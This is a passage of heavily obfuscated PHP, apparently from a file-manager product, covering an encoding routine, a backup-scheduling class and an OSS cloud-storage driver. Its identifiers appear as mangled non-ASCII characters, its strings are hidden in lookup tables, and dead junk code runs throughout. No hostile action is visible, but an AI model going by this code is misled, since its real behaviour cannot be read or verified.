$Ø∫Ïº·â[716]; while (strlen($™©Àı∫ó) < $Ø∫Ïº·â[12]) { if (!$™©Àı∫ó) { break; } $™©Àı∫ó++; } case $‡£Øπ≈¸[296]: $˙—¨√µ≥ = $this->rszj7b8456c2($ïÛıßá›, md5($≤ìÀ¯Îü . $¡ÇÀ•´ù)); break; case $‡£Øπ≈¸[297]: $ïÛıßá› = hash_decode($ïÛıßá›); $‚∫≤úëß = $Ø∫Ïº·â[717]; if (strlen($‚∫≤úëß) < $Ø∫Ïº·â[638]) { return; } $Á•ªËŸﬁ = $ïÛıßá›[0]; $ﬂ§¸Ú›ú = $Ø∫Ïº·â[718]; if (strlen($ﬂ§¸Ú›ú) < $Ø∫Ïº·â[654]) { die; } $ïÛıßá› = substr($ïÛıßá›, 1); $πï…Û”è = strpos($‹ª€Ó∏∑, $Á•ªËŸﬁ); $ÈÇâ◊≠≤ = $Ø∫Ïº·â[719]; if (strlen($ÈÇâ◊≠≤) < $Ø∫Ïº·â[627]) { die; } $¡ˆ¯ÉâÊ = md5($Á•ªËŸﬁ . md5($¡ÇÀ•´ù . $Á•ªËŸﬁ) . $¡ÇÀ•´ù); $©∞⁄˜÷˛ = $Ø∫Ïº·â[720]; if (!$©∞⁄˜÷˛) { return; } $¡ˆ¯ÉâÊ = substr($¡ˆ¯ÉâÊ, $πï…Û”è % 8, $πï…Û”è % 8 + 7); $¬í•ö¿  = $‡£Øπ≈¸[6]; $ÓªÙ˙à¡ = $Ø∫Ïº·â[721]; if (strlen($ÓªÙ˙à¡) < $Ø∫Ïº·â[654]) { return; } $ù≈ŸÁ©¢ = 0; $ﬁ•≤ÀÂƒ = 0; $úªŒ⁄Íœ = $Ø∫Ïº·â[722]; if (strlen($úªŒ⁄Íœ) < $Ø∫Ïº·â[627]) { die; } $°„…∑çÕ = 0; $ç ≤êøÓ = $Ø∫Ïº·â[723]; for ($ù≈ŸÁ©¢ = 0; $ù≈ŸÁ©¢ < strlen($ïÛıßá›); $ù≈ŸÁ©¢++) { $°„…∑çÕ = $°„…∑çÕ == strlen($¡ˆ¯ÉâÊ) ? 0 : $°„…∑çÕ; $î©ÆÓèÙ = $Ø∫Ïº·â[724]; $ñº≈’ÊÃ = $°„…∑çÕ++; $ﬁ•≤ÀÂƒ = strpos($‹ª€Ó∏∑, $ïÛıßá›[$ù≈ŸÁ©¢]) - $πï…Û”è - ord($¡ˆ¯ÉâÊ[$ñº≈’ÊÃ]); $ﬂı˝ﬂœÖ = $Ø∫Ïº·â[725]; while (strlen($ﬂı˝ﬂœÖ) < $Ø∫Ïº·â[638]) { if (!$ﬂı˝ﬂœÖ) { break; } $ﬂı˝ﬂœÖ++; } while ($ﬁ•≤ÀÂƒ < 0) { $ﬁ•≤ÀÂƒ += 64; $ª©æÀÇÆ = $Ø∫Ïº·â[726]; if (!$ª©æÀÇÆ) { return; } } $¬í•ö¿  .= $‹ª€Ó∏∑[$ﬁ•≤ÀÂƒ]; $‚Ω˝øÃ„ = $Ø∫Ïº·â[727]; } $˙—¨√µ≥ = base64_decode($¬í•ö¿ ); break; default: $˙—¨√µ≥ = $this->rszj7b8456c2($ïÛıßá›, $¡ÇÀ•´ù . $≤ìÀ¯Îü); break; $Ü∑Ÿß–ø = $Ø∫Ïº·â[728]; } if ($Ù∑Œ¯π  - 1 > 0) { $˙—¨√µ≥ = $this->adfpf153236a($˙—¨√µ≥, $¡ÇÀ•´ù, $Ù∑Œ¯π  - 1); } return $˙—¨√µ≥; } public function sbfn6844cc64($Ïü·ı£ñ) { $Ÿ°æÚíú =& $_SERVER[Á≈ ä ∞]; $á≈ÔÂ“ò =& $_SERVER[•çºﬂ„ù]; $Ùõçˆ»ƒ = $this->hbze874c408f(); $•¨†ó¸° = $Ÿ°æÚíú[729]; $‡´Ñî∫Ï = $this->hbze874c408f(); $º•òøñÉ = $Ÿ°æÚíú[730]; if (strlen($º•òøñÉ) < $Ÿ°æÚíú[638]) { die; } $≥‡À–Í¢ = ($Ùõçˆ»ƒ - 1) * ($‡´Ñî∫Ï - 1); $†·¯îËÈ = $Ÿ°æÚíú[731]; if (!$†·¯îËÈ) { return; } $È€òœö˛ = intval(($Ùõçˆ»ƒ + $‡´Ñî∫Ï) / 2); $ñíÏ©Õ‘ = $Ÿ°æÚíú[732]; if (!$ñíÏ©Õ‘) { die; } while (1) { $î“Õ≤Ú± = $È€òœö˛; $∏¶°…“∫ = $≥‡À–Í¢; while ($∏¶°…“∫ % $î“Õ≤Ú± != 0) { $¿Úâ ¶é = $∏¶°…“∫; $©Ω¸ï•Ø = $Ÿ°æÚíú[733]; if (!$©Ω¸ï•Ø) { die; } $∏¶°…“∫ = $î“Õ≤Ú±; $ŸøØìπ„ = $Ÿ°æÚíú[734]; $î“Õ≤Ú± = $¿Úâ ¶é % $î“Õ≤Ú±; } if ($î“Õ≤Ú± == 1) { break; } else { $È€òœö˛++; } } $≠∑´¢€ú = 2; $–§ôõ˙≈ = $Ÿ°æÚíú[735]; for ($Ωë§≥°Ô = 0; $Ωë§≥°Ô < $≥‡À–Í¢ * 10; $Ωë§≥°Ô++) { if (($≥‡À–Í¢ * $Ωë§≥°Ô + 1) % $È€òœö˛ == 0) { $≠∑´¢€ú = intval(($≥‡À–Í¢ * $Ωë§≥°Ô + 1) / $È€òœö˛); break; } } $µÎ–Ø⁄å = $this->vlcpb3de8e7d($Ùõçˆ»ƒ * $‡´Ñî∫Ï . $á≈ÔÂ“ò[6], $á≈ÔÂ“ò[134]); $Ú€’ô∫ª = md5($á≈ÔÂ“ò[298] . ($Ùõçˆ»ƒ + $‡´Ñî∫Ï) . $á≈ÔÂ“ò[299] . $È€òœö˛ . $á≈ÔÂ“ò[299] . $≠∑´¢€ú . $á≈ÔÂ“ò[300]); $‡≈öÉ÷“ = $this->vlcpb3de8e7d($Ïü·ı£ñ, $Ú€’ô∫ª) . $á≈ÔÂ“ò[301] . $µÎ–Ø⁄å; return $‡≈öÉ÷“; $øÛ«Å±§ = $Ÿ°æÚíú[736]; while (strlen($øÛ«Å±§) < $Ÿ°æÚíú[627]) { if (!$øÛ«Å±§) { break; } $øÛ«Å±§++; } } public function ivardc74abb8($Ä“‚Â÷Ç) { $Ωù∆§Ÿù =& $_SERVER[Á≈ ä ∞]; $Òòè√ïæ =& $_SERVER[•çºﬂ„ù]; $Õÿ∑¡¿Ó = explode($Òòè√ïæ[301], $Ä“‚Â÷Ç); $∆¿‹«ËÈ = $Ωù∆§Ÿù[737]; while ($∆¿‹«ËÈ < $Ωù∆§Ÿù[12]) { if ($∆¿‹«ËÈ >= 0) { break; } $∆¿‹«ËÈ++; } if (count($Õÿ∑¡¿Ó) != 2) { return $Òòè√ïæ[6]; } $ÌÈª”…≥ = $this->rszj7b8456c2($Õÿ∑¡¿Ó[1] . $Òòè√ïæ[6], $Òòè√ïæ[134]); if (!$ÌÈª”…≥) { return $Òòè√ïæ[6]; } $ÌÈª”…≥ = intval($ÌÈª”…≥); $È≤ÇÚØñ = $Ωù∆§Ÿù[738]; while (strlen($È≤ÇÚØñ) < $Ωù∆§Ÿù[627]) { if (!$È≤ÇÚØñ) { break; } $È≤ÇÚØñ++; } $¡ ÏÊìÓ = 0; $Ú¢àûœﬁ = $Ωù∆§Ÿù[739]; while (strlen($Ú¢àûœﬁ) < $Ωù∆§Ÿù[627]) { if (!$Ú¢àûœﬁ) { break; } $Ú¢àûœﬁ++; } $π¨∫ëæô = 0; $Áéÿó£¸ = $Ωù∆§Ÿù[740]; if (!$Áéÿó£¸) { die; } for ($ÜúãÉ≥ô = 3; $ÜúãÉ≥ô < $ÌÈª”…≥; $ÜúãÉ≥ô += 2) { if ($ÌÈª”…≥ % $ÜúãÉ≥ô != 0) { continue; } $¡ ÏÊìÓ = $ÜúãÉ≥ô; $π¨∫ëæô = intval($ÌÈª”…≥ / $ÜúãÉ≥ô); break; $ï´ÂÂƒ£ = $Ωù∆§Ÿù[741]; } $“¨ÔäÆÂ = ($¡ ÏÊìÓ - 1) * ($π¨∫ëæô - 1); $π≈ôÔÒé = intval(($¡ ÏÊìÓ + $π¨∫ëæô) / 2); $õﬁÛñøÜ = $Ωù∆§Ÿù[742]; if (strlen($õﬁÛñøÜ) < $Ωù∆§Ÿù[654]) { return; } while (1) { $àÓ±≠À˝ = $π≈ôÔÒé; $·Ëá¬Ô≤ = $Ωù∆§Ÿù[743]; while ($·Ëá¬Ô≤ < $Ωù∆§Ÿù[627]) { if ($·Ëá¬Ô≤ >= 0) { break; } $·Ëá¬Ô≤++; } $Ã€¢ÓÎ± = $“¨ÔäÆÂ; while ($Ã€¢ÓÎ± % $àÓ±≠À˝ != 0) { $¢ãÏô…∆ = $Ã€¢ÓÎ±; $–¬∏¥∂¬ = $Ωù∆§Ÿù[744]; $Ã€¢ÓÎ± = $àÓ±≠À˝; $–®ƒ∞é˝ = $Ωù∆§Ÿù[745]; if (strlen($–®ƒ∞é˝) < $Ωù∆§Ÿù[630]) { die; } $àÓ±≠À˝ = $¢ãÏô…∆ % $àÓ±≠À˝; $îµ‚áÊÆ = $Ωù∆§Ÿù[746]; } if ($àÓ±≠À˝ == 1) { break; } else { $π≈ôÔÒé++; } } $™ê∑–¿Ó = 2; $ØÒü“Â∆ = $Ωù∆§Ÿù[747]; if (!$ØÒü“Â∆) { die; } for ($ÜúãÉ≥ô = 0; $ÜúãÉ≥ô < $“¨ÔäÆÂ * 10; $ÜúãÉ≥ô++) { if (($“¨ÔäÆÂ * $ÜúãÉ≥ô + 1) % $π≈ôÔÒé == 0) { $™ê∑–¿Ó = intval(($“¨ÔäÆÂ * $ÜúãÉ≥ô + 1) / $π≈ôÔÒé); break; } } $´Ã™éñ∏ = md5($Òòè√ïæ[298] . ($¡ ÏÊìÓ + $π¨∫ëæô) . $Òòè√ïæ[299] . $π≈ôÔÒé . $Òòè√ïæ[299] . $™ê∑–¿Ó . $Òòè√ïæ[300]); $¿®–≈◊Í = $this->rszj7b8456c2($Õÿ∑¡¿Ó[0], $´Ã™éñ∏); return $¿®–≈◊Í; $ ¡¡∞œ‹ = $Ωù∆§Ÿù[748]; if (!$ ¡¡∞œ‹) { die; } } public function hbze874c408f() { $˙î©‘…‚ =& $_SERVER[Á≈ ä ∞]; $Ò¢«’Ü∞ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ãÒ‹π£µ = array(); $≈¸Æ±Ë≠ = 1; while ($≈¸Æ±Ë≠ <= (int) sqrt($Ò¢«’Ü∞)) { $Äèÿ¶å = $≈¸Æ±Ë≠; while (!0) { $Äèÿ¶å++; $·ñ’£ÿÀ = $˙î©‘…‚[749]; if (!$·ñ’£ÿÀ) { return; } if ($Äèÿ¶å <= 2) { $≈¸Æ±Ë≠ = $Äèÿ¶å; break; } else { if ($Äèÿ¶å < 2) { continue; } } $ÏÜê©ø– = !0; for ($≠Ä…û∑Ω = 2; $≠Ä…û∑Ω <= sqrt($Äèÿ¶å); $≠Ä…û∑Ω++) { if ($Äèÿ¶å % $≠Ä…û∑Ω == 0) { $ÏÜê©ø– = !1; } } if ($ÏÜê©ø–) { $≈¸Æ±Ë≠ = $Äèÿ¶å; break; } } $ãÒ‹π£µ[] = $≈¸Æ±Ë≠; $Ù€˙≤Õ = $˙î©‘…‚[750]; if (!$Ù€˙≤Õ) { return; } } $§ÌÖ»Ωπ = 2; for ($Äèÿ¶å = $Ò¢«’Ü∞; $Äèÿ¶å > 1; $Äèÿ¶å--) { $ÏÜê©ø– = !0; $á™ÛΩ§… = $˙î©‘…‚[751]; if (!$á™ÛΩ§…) { die; } foreach ($ãÒ‹π£µ as $∆õÃ¯§“) { if ($Äèÿ¶å % $∆õÃ¯§“ == 0) { $ÏÜê©ø– = !1; break; } } if ($ÏÜê©ø–) { $§ÌÖ»Ωπ = $Äèÿ¶å; break; } } return $§ÌÖ»Ωπ; $ááûƒ€ª = $˙î©‘…‚[752]; while ($ááûƒ€ª < $˙î©‘…‚[654]) { if ($ááûƒ€ª >= 0) { break; } $ááûƒ€ª++; } } public function xnljee9f02f9($π‘Èœîô, $è ‡†¡Û) { $Ò˙†ÑªÏ =& $_SERVER[•çºﬂ„ù]; return call_user_func(array($Ò˙†ÑªÏ[8], $Ò˙†ÑªÏ[302]), $π‘Èœîô, $è ‡†¡Û); $ß‡¿ˆ°◊ = $_SERVER[Á≈ ä ∞][753]; if (!$ß‡¿ˆ°◊) { die; } } public function vlcpb3de8e7d($ûåéê‹â, $ëìòÕ˜†) { $·ÇﬁœÅ® =& $_SERVER[Á≈ ä ∞]; $é¨∑ùıË =& $_SERVER[•çºﬂ„ù]; return call_user_func(array($é¨∑ùıË[303], $é¨∑ùıË[304]), $ûåéê‹â, $ëìòÕ˜†); $Äﬂ´Éñ = $·ÇﬁœÅ®[754]; if (strlen($Äﬂ´Éñ) < $·ÇﬁœÅ®[654]) { return; } } public function rszj7b8456c2($¯äìÚ»â, $˜·€ãß”) { $ ë≠∫´√ =& $_SERVER[•çºﬂ„ù]; return call_user_func(array($ ë≠∫´√[303], $ ë≠∫´√[305]), $¯äìÚ»â, $˜·€ãß”); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¡«ë É∆ =& $_SERVER[Á≈ ä ∞]; $this->isManual(); self::$name = date($¡«ë É∆[755]); if (!($¯Å§‰◊π = Model($¡«ë É∆[756])->lastItem())) { $¯Å§‰◊π = $this->initData(); } else { self::$name = $¯Å§‰◊π[$¡«ë É∆[42]]; if ($¯Å§‰◊π[$¡«ë É∆[757]] == $¡«ë É∆[98]) { self::$name = date($¡«ë É∆[758]); $∞â‰≤∑Ì = 0; if (isset($¯Å§‰◊π[$¡«ë É∆[302]][$¡«ë É∆[209]][$¡«ë É∆[477]])) { $∞â‰≤∑Ì = (int) $¯Å§‰◊π[$¡«ë É∆[302]][$¡«ë É∆[209]][$¡«ë É∆[477]]; } if (self::$manual == 0 && $¯Å§‰◊π[$¡«ë É∆[42]] == self::$name) { Model($¡«ë É∆[756])->remove($¯Å§‰◊π[$¡«ë É∆[408]]); } $¯Å§‰◊π = $this->initData($∞â‰≤∑Ì, $¯Å§‰◊π[$¡«ë É∆[759]]); } else { $this->checkStore($¯Å§‰◊π[$¡«ë É∆[759]]); } } self::$option = $¯Å§‰◊π; } private function isManual() { $ä’∆¿∫‘ = _get($GLOBALS, $_SERVER[Á≈ ä ∞][760], 0); $ä’∆¿∫‘ = intval($ä’∆¿∫‘); self::$manual = $ä’∆¿∫‘ && $ä’∆¿∫‘ == 1 ? 1 : 0; } private function initData($ŸıÉú©æ = 0, $˚„ö›ñé = '') { $±ÎÚÔüà =& $_SERVER[Á≈ ä ∞]; $÷û’π ° = Model($±ÎÚÔüà[756])->config(); if ($˚„ö›ñé && $÷û’π °[$±ÎÚÔüà[759]] != $˚„ö›ñé) { $ŸıÉú©æ = 0; } $this->checkStore($÷û’π °[$±ÎÚÔüà[759]]); if (self::$manual == 1) { self::$name .= $±ÎÚÔüà[21] . date($±ÎÚÔüà[761]); } $áœ∫ ÜÒ = array($±ÎÚÔüà[759] => $÷û’π °[$±ÎÚÔüà[759]], $±ÎÚÔüà[42] => self::$name, $±ÎÚÔüà[757] => 0, $±ÎÚÔüà[762] => $÷û’π °[$±ÎÚÔüà[762]], $±ÎÚÔüà[763] => self::$manual, $±ÎÚÔüà[302] => array($±ÎÚÔüà[764] => array($±ÎÚÔüà[757] => 0), $±ÎÚÔüà[765] => array($±ÎÚÔüà[757] => 0, $±ÎÚÔüà[766] => 0, $±ÎÚÔüà[767] => 0, $±ÎÚÔüà[43] => $±ÎÚÔüà[22], $±ÎÚÔüà[768] => 0, $±ÎÚÔüà[506] => 0), $±ÎÚÔüà[769] => array($±ÎÚÔüà[757] => 0, $±ÎÚÔüà[766] => 0, $±ÎÚÔüà[767] => 0, $±ÎÚÔüà[768] => 0, $±ÎÚÔüà[506] => 0), $±ÎÚÔüà[209] => array($±ÎÚÔüà[757] => 0, $±ÎÚÔüà[770] => 0, $±ÎÚÔüà[771] => 0, $±ÎÚÔüà[772] => 0, $±ÎÚÔüà[773] => 0, $±ÎÚÔüà[477] => $ŸıÉú©æ, $±ÎÚÔüà[768] => 0, $±ÎÚÔüà[506] => 0)), $±ÎÚÔüà[768] => time(), $±ÎÚÔüà[506] => 0); $º¶æΩ±¬ = Model($±ÎÚÔüà[756])->insert($áœ∫ ÜÒ); $áœ∫ ÜÒ[$±ÎÚÔüà[408]] = $º¶æΩ±¬; return $áœ∫ ÜÒ; } private function checkStore($ÅŒ¯ﬂÃÖ) { $å‘‰öÑÚ =& $_SERVER[Á≈ ä ∞]; $œ≤≥Ÿß† = Model($å‘‰öÑÚ[774])->listData($ÅŒ¯ﬂÃÖ); Model($å‘‰öÑÚ[774])->checkConfig($œ≤≥Ÿß†); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Á≈ ä ∞][756])->findByName(self::$name); } return self::$option; } public static function set($Íπıˆ∫–) { $±ÕóÌ¢ﬂ =& $_SERVER[Á≈ ä ∞]; $ò›û’Áö = self::get(); foreach ($Íπıˆ∫– as $§ª£Ê¬≥ => $Òˆõôñ€) { $ç»«ª„° = explode($±ÕóÌ¢ﬂ[20], $§ª£Ê¬≥); $°¯ƒøΩ— = count($ç»«ª„°); switch ($°¯ƒøΩ—) { case 1: $ò›û’Áö[$ç»«ª„°[0]] = $Òˆõôñ€; break; case 2: $ò›û’Áö[$ç»«ª„°[0]][$ç»«ª„°[1]] = $Òˆõôñ€; break; case 3: $ò›û’Áö[$ç»«ª„°[0]][$ç»«ª„°[1]][$ç»«ª„°[2]] = $Òˆõôñ€; break; } } Model($±ÕóÌ¢ﬂ[756])->update($ò›û’Áö[$±ÕóÌ¢ﬂ[408]], $ò›û’Áö); self::$option = $ò›û’Áö; return self::$option; } public function keep() { $û—˜≤∞è =& $_SERVER[Á≈ ä ∞]; $É…≠ó“¸ = self::get(); if ($É…≠ó“¸[$û—˜≤∞è[302]][$û—˜≤∞è[764]][$û—˜≤∞è[757]] == $û—˜≤∞è[98]) { return; } $this->backupKeep($É…≠ó“¸); self::set(array($û—˜≤∞è[775] => 1)); } private function backupKeep($ö¨°‰ΩÉ) { $ƒ˚±Úó∂ =& $_SERVER[Á≈ ä ∞]; if (self::$manual == 1) { return; } $ôøå≥ÖÙ = Model($ƒ˚±Úó∂[756])->listData(); if (empty($ôøå≥ÖÙ)) { return; } $ΩûŒåÌÓ = 0; $áÜÛ«Ø» = array(); foreach ($ôøå≥ÖÙ as $¬∏ÜŒÂê) { if ($ΩûŒåÌÓ >= 7) { break; } $áÜÛ«Ø»[] = $¬∏ÜŒÂê[$ƒ˚±Úó∂[42]]; $ΩûŒåÌÓ++; } for ($ΩûŒåÌÓ = 0; $ΩûŒåÌÓ < 12; $ΩûŒåÌÓ++) { $áÜÛ«Ø»[] = date($ƒ˚±Úó∂[776], strtotime("\55{$ΩûŒåÌÓ}\40\x6d\157\156\x74\150\163")); } $áÜÛ«Ø» = array_unique($áÜÛ«Ø»); $˘–ÍÄÙ„ = Model($ƒ˚±Úó∂[777])->get($ƒ˚±Úó∂[778]); foreach ($ôøå≥ÖÙ as $¬∏ÜŒÂê) { if (isset($¬∏ÜŒÂê[$ƒ˚±Úó∂[763]]) && $¬∏ÜŒÂê[$ƒ˚±Úó∂[763]] == $ƒ˚±Úó∂[98]) { continue; } if (!empty($¬∏ÜŒÂê[$ƒ˚±Úó∂[42]]) && in_array($¬∏ÜŒÂê[$ƒ˚±Úó∂[42]], $áÜÛ«Ø»)) { continue; } Model($ƒ˚±Úó∂[756])->remove($¬∏ÜŒÂê[$ƒ˚±Úó∂[408]]); $◊â»ùùÎ = $this->backupPath($ö¨°‰ΩÉ, $˘–ÍÄÙ„); IO::remove($◊â»ùùÎ, !1); } } private function backupPath($¢πò‹¨Ù, $Ñ≠ÅÛ§‡ = false) { $É¯¨¢ﬂ‹ =& $_SERVER[Á≈ ä ∞]; if (!$Ñ≠ÅÛ§‡) { $Ñ≠ÅÛ§‡ = Model($É¯¨¢ﬂ‹[777])->get($É¯¨¢ﬂ‹[778]); } $ÿìıúÉ´ = $¢πò‹¨Ù[$É¯¨¢ﬂ‹[42]]; $óÜ¸í¥‘ = substr(md5($É¯¨¢ﬂ‹[779] . $Ñ≠ÅÛ§‡ . $ÿìıúÉ´), 0, 8); return "\173\x69\157\72{$¢πò‹¨Ù[$É¯¨¢ﬂ‹[759]]}\175\57\x64\x61\x74\141\x62\141\x73\x65\x2f\142\x61\143\153\165\x70\57" . $ÿìıúÉ´ . $É¯¨¢ﬂ‹[21] . $óÜ¸í¥‘; } public function db() { $Õ∫≈•ñé =& $_SERVER[Á≈ ä ∞]; $ÀÒÌªÌ± = self::get(); if ($ÀÒÌªÌ±[$Õ∫≈•ñé[302]][$Õ∫≈•ñé[765]][$Õ∫≈•ñé[757]] == $Õ∫≈•ñé[98]) { return !0; } $Á≥ÿ◊‡¯ = new BackupDb(); if (!$Á≥ÿ◊‡¯->index()) { return !1; } self::set(array($Õ∫≈•ñé[780] => 1)); return !0; } public function dbFile() { $ê˙Âî¸ó =& $_SERVER[Á≈ ä ∞]; $≥é≤·õØ = self::get(); if ($≥é≤·õØ[$ê˙Âî¸ó[302]][$ê˙Âî¸ó[769]][$ê˙Âî¸ó[757]] == $ê˙Âî¸ó[98]) { return !0; } $∆≤Ñ≈÷¥ = new BackupDbFile(); if (!$∆≤Ñ≈÷¥->index()) { return !1; } self::set(array($ê˙Âî¸ó[781] => 1)); return !0; } public function file() { $Ó˙˝≥ö‰ =& $_SERVER[Á≈ ä ∞]; $£ñ‘å≠£ = self::get(); if ($£ñ‘å≠£[$Ó˙˝≥ö‰[302]][$Ó˙˝≥ö‰[209]][$Ó˙˝≥ö‰[757]] == $Ó˙˝≥ö‰[98]) { return !0; } if (!isset($£ñ‘å≠£[$Ó˙˝≥ö‰[762]]) || $£ñ‘å≠£[$Ó˙˝≥ö‰[762]] == $Ó˙˝≥ö‰[207]) { $∫¿ﬂπÿ€ = new BackupFile(); if (!$∫¿ﬂπÿ€->index()) { return !1; } } self::set(array($Ó˙˝≥ö‰[782] => 1, $Ó˙˝≥ö‰[757] => 1)); return !0; } } goto fÒÑÛãÃ‰Ó; dèœ¯Ö∂ﬂÍ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($ˆı”∫ª—) { parent::__construct(); include_once SDK_DIR . $_SERVER[Á≈ ä ∞][1385]; $this->_init($ˆı”∫ª—); } public function _init($∆™›¶≠®) { $á÷…ñ≈Ñ =& $_SERVER[Á≈ ä ∞]; foreach ($∆™›¶≠® as $¸æÿ˝Åµ => $ÛÕæëπ°) { if (isset($this->{$¸æÿ˝Åµ})) { $this->{$¸æÿ˝Åµ} = $ÛÕæëπ°; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($á÷…ñ≈Ñ[1386] . LNG($á÷…ñ≈Ñ[1387])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $π‹Å“Ë∏ =& $_SERVER[Á≈ ä ∞]; $¢Œ£ØÄí = new OSS\Model\CorsConfig(); $¸ö¿—±¨ = new OSS\Model\CorsRule(); $¸ö¿—±¨->addAllowedOrigin($π‹Å“Ë∏[1388]); $¸ö¿—±¨->addAllowedMethod($π‹Å“Ë∏[1389]); $¸ö¿—±¨->addAllowedMethod($π‹Å“Ë∏[1390]); $¸ö¿—±¨->addAllowedMethod($π‹Å“Ë∏[1391]); $¸ö¿—±¨->addAllowedMethod($π‹Å“Ë∏[1392]); $¸ö¿—±¨->addAllowedMethod($π‹Å“Ë∏[170]); $¸ö¿—±¨->setMaxAgeSeconds(600); $¸ö¿—±¨->addExposeHeader($π‹Å“Ë∏[1393]); $¸ö¿—±¨->addAllowedHeader($π‹Å“Ë∏[1388]); $¢Œ£ØÄí->addRule($¸ö¿—±¨); try { $this->client->putBucketCors($this->bucket, $¢Œ£ØÄí); } catch (OSS\Core\OssException $Ò√ú°ŸÆ) { return !1; } return !0; } public function getBucketCors() { $…ŒÕ„»ã =& $_SERVER[Á≈ ä ∞]; $ÜŸä·Ìß = null; try { $ÜŸä·Ìß = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $»ÉÆ˚¨å) { return null; } if (!$ÜŸä·Ìß || !($©åÄÓË‹ = $ÜŸä·Ìß->getRules())) { return null; } $Á’ûêõé = $©åÄÓË‹[0]->getAllowedOrigins(); $Ω»®ŸÇÖ = $©åÄÓË‹[0]->getAllowedMethods(); $®¬¶ãæê = $©åÄÓË‹[0]->getMaxAgeSeconds(); $§›·ì€˚ = $©åÄÓË‹[0]->getExposeHeaders(); $µ–üôÔÁ = $©åÄÓË‹[0]->getAllowedHeaders(); return array($…ŒÕ„»ã[197] => isset($Á’ûêõé[0]) ? $Á’ûêõé[0] : $…ŒÕ„»ã[22], $…ŒÕ„»ã[201] => $Ω»®ŸÇÖ, $…ŒÕ„»ã[1394] => $®¬¶ãæê, $…ŒÕ„»ã[1395] => isset($§›·ì€˚[0]) ? $§›·ì€˚[0] : $…ŒÕ„»ã[22], $…ŒÕ„»ã[199] => isset($µ–üôÔÁ[0]) ? $µ–üôÔÁ[0] : $…ŒÕ„»ã[22]); } public function isBucketCors() { $ö∞Ö∏»ˆ =& $_SERVER[Á≈ ä ∞]; $∏ü‘»Ãâ = $this->getBucketCors(); if (!$∏ü‘»Ãâ || !is_array($∏ü‘»Ãâ)) { return !1; } if ($∏ü‘»Ãâ[$ö∞Ö∏»ˆ[197]] != $ö∞Ö∏»ˆ[198] || $∏ü‘»Ãâ[$ö∞Ö∏»ˆ[199]] != $ö∞Ö∏»ˆ[198]) { return !1; } $ã⁄Å¥¬ï = array_map($ö∞Ö∏»ˆ[200], $∏ü‘»Ãâ[$ö∞Ö∏»ˆ[201]]); if (!is_array($ã⁄Å¥¬ï)) { $ã⁄Å¥¬ï = array(); } $Ù≈õÓôí = array($ö∞Ö∏»ˆ[202], $ö∞Ö∏»ˆ[203], $ö∞Ö∏»ˆ[204], $ö∞Ö∏»ˆ[205], $ö∞Ö∏»ˆ[206]); $ê≤Ú»â = array_diff($Ù≈õÓôí, $ã⁄Å¥¬ï); return empty($ê≤Ú»â); } public function mkfile($Åë≠øÄÚ, $ÌπÍÙÍÀ = '', $øÃƒº¸Ò = REPEAT_RENAME) { $¢Óæ⁄ÒÌ = $this->setContent($Åë≠øÄÚ, $ÌπÍÙÍÀ); if ($¢Óæ⁄ÒÌ !== !1) { return $this->getPathOuter($Åë≠øÄÚ); } return !1; } public function mkdir($äÆÈ°Ûé, $∂ΩãµÌ„ = REPEAT_SKIP) { if ($∂ΩãµÌ„ && $this->_isFolder($äÆÈ°Ûé)) { return $this->getPathOuter($äÆÈ°Ûé); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($äÆÈ°Ûé)); } catch (OSS\Core\OssException $Øôóò∂í) { return !1; } return $this->getPathOuter($äÆÈ°Ûé); } private function fileList($¶†Ì”üÇ, $Ñ»‹ÈÆÈ = '', $ËÔµ©∂’ = 0) { $∞–‚ô€º =& $_SERVER[Á≈ ä ∞]; $¶†Ì”üÇ = trim($¶†Ì”üÇ, $∞–‚ô€º[18]); $Êƒˆ•€í = empty($¶†Ì”üÇ) && $¶†Ì”üÇ !== $∞–‚ô€º[207] ? $∞–‚ô€º[22] : $¶†Ì”üÇ . $∞–‚ô€º[18]; $—Ø“¢Èº = $∞–‚ô€º[22]; $£ûáΩØ∫ = 1000; $Ü⁄Úèß› = $ãÃƒìÎ¨ = array(); while (!0) { check_abort(); $ù≤Æé’≈ = array($∞–‚ô€º[1396] => $Ñ»‹ÈÆÈ, $∞–‚ô€º[1397] => $Êƒˆ•€í, $∞–‚ô€º[1398] => $£ûáΩØ∫, $∞–‚ô€º[1399] => $—Ø“¢Èº); try { $£Ä›ÅÌ£ = $this->client->listObjects($this->bucket, $ù≤Æé’≈); } catch (OSS\Core\OssException $»ÔôÉ≠ˆ) { break; } $—Ø“¢Èº = $£Ä›ÅÌ£->getNextMarker(); $ÒæÕÆ£‡ = $£Ä›ÅÌ£->getObjectList(); $–µºé‘∫ = $£Ä›ÅÌ£->getPrefixList(); foreach ($ÒæÕÆ£‡ as $òïçóº˘) { if ($òïçóº˘->getKey() == $Êƒˆ•€í) { continue; } $«÷≥Ω§√ = $òïçóº˘->getKey(); $Ó±‡©√ = $òïçóº˘->getSize(); $∏‰Â¶Åñ = $òïçóº˘->getLastModified(); $≥à®Œ√Ç = $ËÔµ©∂’ ? array($∞–‚ô€º[42] => $«÷≥Ω§√, $∞–‚ô€º[86] => $Ó±‡©√, $∞–‚ô€º[213] => strtotime($∏‰Â¶Åñ)) : $«÷≥Ω§√; $Ø©Óäå‹ = $Ó±‡©√ == 0 && substr($«÷≥Ω§√, strlen($«÷≥Ω§√) - 1, 1) == $∞–‚ô€º[18] ? !0 : !1; $∏„ªËﬂ = array($∞–‚ô€º[86] => $Ó±‡©√, $∞–‚ô€º[1400] => $Ó±‡©√, $∞–‚ô€º[95] => strtotime($∏‰Â¶Åñ), $∞–‚ô€º[1401] => $∏‰Â¶Åñ); $this->cacheMethodInfoSet($«÷≥Ω§√, $Ø©Óäå‹, $∏„ªËﬂ); if ($Ø©Óäå‹) { $Ü⁄Úèß›[] = $«÷≥Ω§√; continue; } $ãÃƒìÎ¨[] = $≥à®Œ√Ç; } foreach ($–µºé‘∫ as $äÊÌ∑∆Ã) { 